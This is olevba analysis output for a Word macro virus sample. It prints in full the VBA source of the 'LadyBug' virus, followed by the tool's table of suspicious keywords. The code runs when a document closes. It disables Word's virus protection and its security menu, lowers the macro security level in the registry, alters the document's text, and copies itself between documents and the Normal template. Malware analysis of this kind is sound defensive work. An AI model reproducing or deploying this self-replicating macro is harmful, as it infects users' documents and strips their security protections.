olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Fool.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Fool.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LadyBug.bas 
in file: ./Virus.MSWord.Fool.g - OLE stream: 'Macros/VBA/LadyBug'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
    'LadyBug Virus V1.00
    'The WaLRuS 04/00
    On Error Resume Next
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "mr"
            .Replacement.Text = "mrs"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
    Selection.Find.Execute Replace:=wdReplaceAll
    Set Norm = NormalTemplate.VBProject.VBComponents
    Set Doc = ActiveDocument.VBProject.VBComponents
If Norm.Item("LadyBug").Name <> "LadyBug" Then
    Doc("LadyBug").Export "c:\LadyBug.drv"
    Set infect = NormalTemplate.VBProject
ElseIf Doc.Item("LadyBug").Name <> "LadyBug" Then
    Norm("LAdyBug").Export "c:\LadyBug.drv"
    Set infect = ActiveDocument.VBProject
End If
With Dialogs(wdDialogFileSummaryInfo)
    .Subject = "LadyBug"
    .Execute
End With
infect.VBComponents.Import ("c:\LadyBug.drv")
Kill ("c:\LadyBug.drv")
ActiveDocument.Save
End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

